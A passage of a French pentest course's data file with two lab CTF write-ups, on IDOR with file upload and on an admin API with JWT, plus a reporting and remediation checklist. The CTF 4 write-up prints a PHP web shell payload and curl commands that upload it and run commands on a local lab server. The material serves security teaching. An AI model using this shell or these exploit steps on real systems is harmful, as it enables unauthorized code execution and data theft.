      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Créer deux comptes",
          "p": "Créez un compte standard et un compte administrateur de lab. Téléversez un fichier privé avec le compte admin."
        },
        {
          "h": "Étape 2 — Tester l’IDOR",
          "p": "Avec le compte standard, changez l'identifiant dans /api/users/1 et /api/users/2. Comparez les réponses."
        },
        {
          "h": "Étape 3 — Récupérer la référence",
          "p": "Identifiez le chemin du fichier privé ou le jeton exposé dans la réponse. Utilisez-le pour accéder à la ressource."
        },
        {
          "h": "Étape 4 — Tester l’upload",
          "p": "Téléversez un fichier de test avec une extension alternative, un type MIME falsifié ou un nom double extension."
        },
        {
          "h": "Étape 5 — Exécuter",
          "p": "Accédez au fichier uploadé et exécutez une commande non destructive (id, hostname) pour prouver l'exécution."
        },
        {
          "h": "Étape 6 — Flag et nettoyage",
          "p": "Lisez le flag de lab, puis supprimez le fichier uploadé et révoquez les comptes de test."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Write-up CTF 4 — IDOR et upload",
      "x": "CTF 4/5 — IDOR et upload\nFlag : flag{m31_ctf4_idor_upload}\n\n# 1. IDOR\ncurl -s -b user.txt http://127.0.0.1:8080/api/users/1 | jq .\ncurl -s -b user.txt http://127.0.0.1:8080/api/users/2 | jq .\n# Observer le champ file_path ou token exposé\n\n# 2. Accéder au fichier privé\ncurl -s -b user.txt http://127.0.0.1:8080/files/2/private.txt\n\n# 3. Upload avec extension alternative\nprintf \"<?php echo shell_exec($_GET['c']); ?>\" > lab/m31/ctf4/shell.php\ncurl -s -b user.txt -F \"file=@lab/m31/ctf4/shell.php;type=image/jpeg\" \\\n  http://127.0.0.1:8080/upload.php\n\n# 4. Exécution de test\ncurl -s \"http://127.0.0.1:8080/uploads/shell.php?c=id\"\n\n# 5. Flag\ncurl -s \"http://127.0.0.1:8080/uploads/shell.php?c=cat%20/var/www/flag.txt\"\n\nRemédiation : autorisation par objet, validate real MIME, rename, store outside webroot,\ndisable execution in upload dir, short-lived signed URLs, audit logs."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Remédiation CTF 4",
      "x": "Vérifier l'autorisation côté serveur pour chaque objet, ne jamais exposer de chemins internes, valider le type réel du fichier, renommer et stocker hors du webroot, désactiver l'exécution dans le dossier d'upload et utiliser des URL signées à durée limitée."
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "CTF 5/5 — L’API admin",
      "x": "<strong>Objectif :</strong> exploiter une API de lab qui ne vérifie pas le rôle côté serveur (ou un JWT mal validé) pour accéder à une fonction administrateur et récupérer le flag.<br><strong>Environnement :</strong> API de lab avec /api/admin/flag, jeton utilisateur standard.<br><strong>Flag attendu :</strong> <code>flag{m31_ctf5_api_admin}</code>"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Cartographier l’API",
          "p": "Identifiez les routes, les méthodes et les rôles attendus. Notez le format des jetons."
        },
        {
          "h": "Étape 2 — Tester avec un jeton standard",
          "p": "Appelez /api/admin/users et /api/admin/flag avec le jeton utilisateur. Observez les codes 200/401/403."
        },
        {
          "h": "Étape 3 — Analyser le JWT",
          "p": "Décodez l'en-tête et le payload. Vérifiez l'algorithme, le rôle, l'expiration et la signature."
        },
        {
          "h": "Étape 4 — Tester la validation",
          "p": "Dans le lab, testez si la signature est vérifiée, si alg:none est accepté ou si un secret faible est utilisé."
        },
        {
          "h": "Étape 5 — Accéder à l’admin",
          "p": "Utilisez un jeton de lab avec le rôle admin ou exploitez l'absence de contrôle pour appeler /api/admin/flag."
        },
        {
          "h": "Étape 6 — Rapport",
          "p": "Documentez la cause, l'impact, les preuves et les corrections : vérification de signature, contrôle de rôle serveur, rotation des clés."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Write-up CTF 5 — L’API admin",
      "x": "CTF 5/5 — L’API admin\nFlag : flag{m31_ctf5_api_admin}\n\n# 1. Jeton utilisateur standard\nUSER_TOKEN=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"\ncurl -s -o /dev/null -w \"%{http_code}\\n\" \\\n  -H \"Authorization: Bearer $USER_TOKEN\" http://127.0.0.1:8080/api/admin/users\n\n# 2. Décoder le JWT\npython3 - <<'PY'\nimport base64, json, os\nt=os.environ[\"USER_TOKEN\"]\nfor p in t.split(\".\")[:2]:\n    p += \"=\" * (-len(p) % 4)\n    print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))\nPY\n\n# 3. Test de rôle côté serveur (lab)\n# Si le serveur ne vérifie que la présence du jeton :\ncurl -s -H \"Authorization: Bearer $USER_TOKEN\" http://127.0.0.1:8080/api/admin/flag | jq .\n\n# 4. Variante alg:none / signature non vérifiée (lab uniquement)\n# Construire un jeton avec role=admin et tester sur le lab\n\nRemédiation : vérifier la signature et l algorithme attendu, contrôle de rôle serveur,\nexpiration courte, rotation des clés, révocation, audience/issuer, rate limiting."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Remédiation CTF 5",
      "x": "Vérifier systématiquement la signature et l'algorithme attendu, refuser alg:none, contrôler le rôle côté serveur pour chaque route, limiter la durée de vie des jetons, prévoir la révocation et journaliser les accès administratifs."
    },
    {
      "t": "h",
      "x": "31.12 Checklist finale, rapport et remédiation"
    },
    {
      "t": "p",
      "x": "Un pentest de clone local se termine par un rapport clair et une série de corrections priorisées. Le rapport doit permettre à une équipe technique de reproduire les constats, de comprendre l'impact et de vérifier les corrections. Évitez les rapports « bruts » sans contexte : un bon rapport raconte une histoire, avec des preuves et des décisions."
    },
    {
      "t": "ul",
      "x": [
        "Périmètre : URLs, comptes, versions, dates, exclusions et règles d'engagement.",
        "Méthodologie : reconnaissance, cartographie, tests d'authentification, injections, API, upload, logique métier.",
        "Constats : titre, sévérité, description, preuve, impact, cause racine, remédiation, référence.",
        "Preuves : requêtes/réponses, captures horodatées, hashes, journaux, versions d'outils.",
        "Chaînes d'exploitation : étapes, conditions, impact cumulé.",
        "Remédiations : priorité, effort, responsable, test de vérification.",
        "Annexes : wordlists, configurations, scripts de lab, limites du test.",
        "Nettoyage : comptes supprimés, fichiers retirés, snapshots restaurés, données détruites."
      ]
    },
    {
      "t": "table",
      "head": [
        "Sévérité",
        "Exemple",
        "Délai indicatif",
        "Action attendue"
      ],
      "rows": [
        [
          "Critique",
          "Exécution de code, accès admin, fuite massive de données",
          "Immédiat / 24 h",
          "Correction ou atténuation immédiate, incident response"
        ],
        [
          "Élevée",
          "SQLi exploitable, IDOR sensible, upload exécutable",
          "72 h",
          "Correctif planifié, contrôle compensatoire"
        ],
        [
          "Moyenne",
          "XSS stocké limité, cookie sans SameSite, rate limit absent",
          "2 semaines",
          "Correction dans le cycle normal"
        ],
        [
          "Faible",
          "En-tête manquant, version exposée, information disclosure mineure",
          "Prochain cycle",
          "Durcissement et bonnes pratiques"
        ]
      ]
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "Modèle de rapport",
      "x": "<strong>1. Synthèse exécutive</strong> (3-5 lignes) · <strong>2. Périmètre et méthodologie</strong> · <strong>3. Chronologie</strong> · <strong>4. Constats détaillés</strong> · <strong>5. Chaînes et impact</strong> · <strong>6. Remédiations priorisées</strong> · <strong>7. Annexes et preuves</strong>. Ajoutez une matrice de risque et une checklist de vérification."
    },
    {
      "t": "p",
      "x": "<strong>Conclusion.</strong> Le clonage local est un outil pédagogique puissant : il permet de comprendre une application, de reproduire des scénarios et de vérifier des corrections sans toucher à la production. Mais il exige une discipline stricte : autorisation, isolation, journalisation, minimisation des données et nettoyage. Un clone n'est pas une cible réelle ; les résultats doivent toujours être interprétés avec leurs limites et revalidés dans le cadre autorisé."
    },
    {
      "t": "mini",
      "items": [
        {
          "v": "lime",
          "h": "À retenir",
          "p": "Cloner pour comprendre, isoler pour tester, prouver pour convaincre, corriger pour protéger."
        },
        {
          "v": "amber",
          "h": "Erreur fréquente",
          "p": "Passer directement à l'exploitation sans cartographier ni documenter. La méthode fait la différence."
        },
        {
          "v": "red",
          "h": "Limite absolue",
          "p": "Pas d'autorisation = pas de test. Pas de lab isolé = pas de payload. Pas de preuve = pas de constat."
        }
      ]
    }
  ],
  "quiz": "q31"
};
